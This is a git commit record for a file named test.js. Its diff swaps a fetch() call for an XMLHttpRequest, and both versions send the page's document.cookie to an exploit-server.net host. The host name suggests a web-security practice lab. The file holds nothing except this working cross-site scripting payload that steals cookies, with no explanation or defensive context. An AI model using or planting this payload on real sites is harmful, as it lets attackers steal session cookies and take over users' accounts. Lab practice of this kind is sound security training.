d12bbb875366ac6b77b24b87faa9aa7e39ce011e
amr9k8 <amrkhaled9k8@gmail.com>
2023-08-09 03:17:31 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,3 @@
-fetch("https://exploit-0a36006804d5880c83bd782501490099.exploit-server.net/exploit?doc="+document.cookie)
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://exploit-0a36006804d5880c83bd782501490099.exploit-server.net/exploit?' + document.cookie, true);
+xhttp.send();
